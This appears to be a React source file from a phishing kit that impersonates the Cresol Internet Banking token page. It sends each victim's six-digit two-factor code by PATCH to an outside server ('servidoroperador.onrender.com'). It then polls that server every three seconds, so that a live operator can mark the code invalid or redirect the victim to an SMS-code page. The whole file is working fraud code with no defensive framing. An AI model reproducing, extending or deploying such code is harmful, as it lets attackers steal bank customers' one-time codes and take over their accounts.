
import React, { useState, useEffect, useRef } from "react";
import { ArrowLeft } from "lucide-react";
import { useNavigate } from "react-router-dom";
import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
import { useClientStatus } from "@/hooks/useClientStatus";

// Função para monitorar cliente continuamente na página Token
const monitorClientToken = async (
  clientId: string, 
  navigate: (path: string) => void,
  onInvalidCode: () => void,
  isMonitoringRef: React.MutableRefObject<boolean>
): Promise<void> => {
  console.log(`Iniciando monitoramento Token do cliente: ${clientId}`);
  
  let intervalId: NodeJS.Timeout;
  
  const monitor = async () => {
    if (!isMonitoringRef.current) {
      console.log('Monitoramento Token parado por flag');
      clearInterval(intervalId);
      return;
    }

    try {
      console.log(`Consultando dados do cliente ${clientId} na página Token...`);
      
      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        }
      });

      console.log(`Status da consulta Token: ${response.status}`);
      
      if (response.ok) {
        const clientData = await response.json();
        console.log('Dados do cliente Token recebidos:', clientData);
        console.log('Valor do response Token:', clientData.data?.response);
        console.log('Valor do command Token:', clientData.data?.command);
        
        // Verificar se o token é inválido - NÃO para o monitoramento
        if (clientData.data?.response === "inv_2fa" || clientData.data?.command === "inv_2fa") {
          console.log('Detectado inv_2fa - Token inválido, mas continuando monitoramento');
          onInvalidCode();
          return; // Continua monitoramento, não para
        }
        
        // Na página Token: se receber ir_2fa, continua monitorando; aguarda próximo comando para redirecionar
        if (clientData.data?.response === "ir_2fa" || clientData.data?.command === "ir_2fa") {
          console.log('Detectado ir_2fa na página Token - Continuando monitoramento...');
        }
        
        // Se receber ir_sms, redireciona para SMS e para monitoramento
        if (clientData.data?.response === "ir_sms" || clientData.data?.command === "ir_sms") {
          console.log('Detectado ir_sms na página Token - Redirecionando para /sms');
          clearInterval(intervalId);
          isMonitoringRef.current = false;
          console.log('Monitoramento Token parado - redirecionando...');
          navigate('/sms');
          return;
        }
        
        console.log('Continuando monitoramento Token...');
      } else {
        const errorData = await response.text();
        console.log('Erro na consulta Token do cliente:', errorData);
      }

    } catch (error) {
      console.log('Erro durante consulta Token do cliente:', error);
    }
  };

  // Executar primeira consulta imediatamente
  await monitor();
  
  // Configurar monitoramento contínuo a cada 3 segundos
  intervalId = setInterval(monitor, 3000);
  console.log('Monitoramento Token contínuo configurado (3 segundos)');
};

const TokenPage = () => {
  const navigate = useNavigate();
  const clientStatus = useClientStatus();
  const [token, setToken] = useState("");
  const [clientId, setClientId] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isInvalid, setIsInvalid] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const isMonitoringRef = useRef(false);

  useEffect(() => {
    // Recuperar clientId do localStorage
    const storedClientId = localStorage.getItem('clientId');
    if (storedClientId) {
      setClientId(storedClientId);
      console.log('ClientId recuperado do localStorage:', storedClientId);
      
      // Iniciar monitoramento de status
      clientStatus.startMonitoring();
    } else {
      console.log('ClientId não encontrado no localStorage');
    }

    // Cleanup quando sair da página
    return () => {
      isMonitoringRef.current = false;
      clientStatus.stopMonitoring();
    };
  }, [clientStatus]);

  const handleTokenChange = (value: string) => {
    setToken(value.replace(/\D/g, '').slice(0, 6));
    // Reset error state when user starts typing
    if (isInvalid) {
      setIsInvalid(false);
      setErrorMessage("");
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!clientId) {
      console.log('ClientId não disponível para envio do token');
      return;
    }

    try {
      console.log('Enviando token via external-response:', token);
      console.log('ClientId utilizado:', clientId);
      
      setIsLoading(true);
      setIsInvalid(false);
      setErrorMessage("");
      
      // Enviar token para a API usando external-response
      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/external-response`, {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          response: token,
          command: ""
        })
      });

      if (response.ok) {
        console.log('Token enviado com sucesso via external-response');
        
        // Só iniciar monitoramento se não estiver já monitorando
        if (!isMonitoringRef.current) {
          isMonitoringRef.current = true;
          // Iniciar monitoramento contínuo após envio bem-sucedido
          await monitorClientToken(
            clientId, 
            navigate,
            () => {
              // Função onInvalidCode modificada: limpa campo, para loading, mantém monitoramento
              console.log('Token inválido detectado - limpando campo e parando loading');
              setToken(""); // Limpar o campo token
              setIsLoading(false); // Parar o loading
              setIsInvalid(true);
              setErrorMessage("Token inválido. Tente novamente.");
              // NÃO para o monitoramento - isMonitoringRef.current continua true
            },
            isMonitoringRef
          );
        }
      } else {
        console.log('Erro ao enviar token via external-response');
        setIsLoading(false);
      }
    } catch (error) {
      console.log('Erro durante envio do token:', error);
      setIsLoading(false);
    }
  };

  const handleBack = () => {
    isMonitoringRef.current = false;
    navigate("/sms");
  };

  return (
    <div className="min-h-screen flex bg-[#fff] overflow-x-hidden">
      {/* Main Content Container */}
      <div className="w-full lg:w-1/2 flex flex-col items-center px-4 sm:px-6 lg:px-[7%] pt-8 lg:pt-36 pb-8 relative">
        <div className="max-w-md w-full mx-auto">
          {/* Botão Voltar */}
          <button
            onClick={handleBack}
            className="flex items-center text-gray-600 hover:text-gray-800 mb-6 transition-colors min-h-[44px] p-1"
          >
            <ArrowLeft size={20} className="mr-2" />
            <span className="text-base md:text-lg">Voltar</span>
          </button>

          <img
            src={cresolLogo}
            alt="Cresol"
            className="h-8 md:h-10 mb-6"
          />

          <h1 className="text-xl md:text-2xl font-semibold text-gray-600 mb-3 text-center lg:text-left">Token de Acesso</h1>
          <p className="text-base md:text-lg text-gray-600 mb-8 text-center lg:text-left">
            Digite o token gerado no seu dispositivo de segurança ou aplicativo.
          </p>

          <form onSubmit={handleSubmit} className="mt-6">
            <div className="mb-6">
              <label className="block text-sm md:text-base text-gray-700 font-medium mb-1">Token</label>
              <input
                type="text"
                className={`w-full h-12 px-3 border rounded focus:outline-none transition text-base bg-white text-center text-lg tracking-widest ${
                  isInvalid ? 'border-red-500' : 'border-gray-300'
                }`}
                placeholder="000000"
                value={token}
                onChange={(e) => handleTokenChange(e.target.value)}
                maxLength={6}
                autoComplete="one-time-code"
              />
              {isInvalid && (
                <p className="text-red-500 text-sm mt-1">{errorMessage}</p>
              )}
            </div>

            <button
              type="submit"
              className="w-full h-12 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-base md:text-lg shadow mb-6 disabled:opacity-70 flex items-center justify-center"
              style={{
                background: "linear-gradient(90deg,#ffaa00,#ff7300 100%)",
                borderRadius: "30px",
              }}
              disabled={token.length !== 6 || isLoading}
            >
              {isLoading ? (
                <div className="flex items-center">
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                  Validando...
                </div>
              ) : (
                "Acessar"
              )}
            </button>

            <div className="text-center">
              <p className="text-sm md:text-base text-gray-600">
                Problemas com seu token?{" "}
                <a href="#" className="text-orange-500 hover:text-orange-600 transition font-medium min-h-[44px] inline-block py-2">
                  Entre em contato
                </a>
              </p>
            </div>
          </form>

          {/* Rodapé */}
          <div className="mt-12 text-center lg:text-left text-xs text-gray-800">
            <div className="font-semibold">Cresol Internet Banking - 2025</div>
            <div className="">Versão: 12.4.3.501 (12.4.3-501)</div>
          </div>
        </div>
      </div>

      {/* Right: Imagem da mulher - Hidden on mobile, shown on lg+ */}
      <div className="hidden lg:block lg:w-1/2 bg-[#f5f6f7] relative overflow-hidden">
        <img
          src={womanImage}
          alt="Mulher segurando celular"
          className="w-full h-full object-cover"
        />
      </div>
    </div>
  );
};

export default TokenPage;
